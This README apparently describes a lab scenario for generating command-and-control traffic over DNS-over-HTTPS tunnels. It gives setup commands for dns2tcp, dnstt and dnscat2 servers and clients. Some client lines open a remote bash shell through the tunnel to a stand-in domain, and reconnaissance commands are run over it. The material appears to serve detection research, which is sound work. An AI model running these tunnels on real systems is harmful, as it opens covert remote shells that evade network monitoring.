# DNS Tunnel over DoH
## Description
Manual C2 over DoH Tunnel scenario.

## Overview
```       
scenarios/doh_tunnel/               # Main scenario directory
├── dns_server                      # Recursive / forwarding DoH-servers
│   ├── dns-over-https.bash
│   └── dns-over-https.yaml
├── dns_tunnel
│   ├── dns2tcp_client_setup.bash
│   ├── dns2tcp_server_setup
│   ├── dns2tcp.yaml
│   ├── dnscat2_client.bash
│   ├── dnscat2_server.bash
│   ├── dnscat2.yaml.disabled       # Disabled due to a bug in DNSCAT2
│   ├── dnstt_client_setup.bash
│   ├── dnstt_server_setup.bash
│   └── dnstt.yaml
├── doh_tunnel.yaml
└── README.md
```

## C2 Commands
The following shell commands were executed in each C2 channel:
```bash
whoami
pwd
w
uname -a
ip a
env
```

### DNS2TCP
```bash
# Server Side
dns2tcpd -F -f /opt/dns2tcpdrc -d 1
socat -d TCP4-LISTEN:1337 STDOUT
< ENTER C2 COMMANDS HERE >

# Client Side
dns2tcpc -z example.attack -k 0xDEADBEEF 127.0.0.1 -c -T TXT -r socat -e '/bin/bash'
```

### DNSTT
```bash
# Server Side
./dnstt-server -udp :53 -privkey {{ private key }} example.attack 127.0.0.1:1337
socat -d TCP4-LISTEN:1337 STDOUT
< ENTER C2 COMMANDS HERE >

# Client Side
./dnstt-client -doh https://192.168.0.10/dns-query -utls none -pubkey {{ public key }} example.attack 127.0.0.1:1337
socat TCP4:127.0.0.1:1337 EXEC:/bin/bash
```

### DNSCAT2 (not executed)
See also: [DNSCAT2 issue #175](https://github.com/iagox86/dnscat2/issues/175)
```bash
# Server Side
sudo ruby ./dnscat2/server/dnscat2.rb example.attack --secret 0xDEADBEEF
window -i 1
shell
< ENTER C2 COMMANDS HERE >

# Client Side
sudo ./dnscat2/client/dnscat --dns server=192.168.0.10,domain=example.attack --secret=0xDEADBEEF
```